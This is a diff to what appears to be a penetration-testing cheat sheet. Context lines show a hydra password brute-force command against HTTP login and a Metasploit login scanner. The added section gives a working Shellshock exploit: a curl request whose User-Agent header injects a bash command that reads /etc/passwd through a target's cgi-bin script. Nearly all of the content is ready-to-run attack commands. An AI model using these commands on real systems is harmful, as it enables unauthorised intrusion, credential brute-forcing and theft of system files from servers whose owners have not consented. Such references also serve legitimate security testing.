@@ -37,3 +37,7 @@ hydra -L UserList -P PassList IP http-get Directorio
 ```
 auxiliary/scanner/http/http_login
 ```
+## Shellshock cgi-bin
+```
+curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://IP/cgi-bin/script.sh
+```
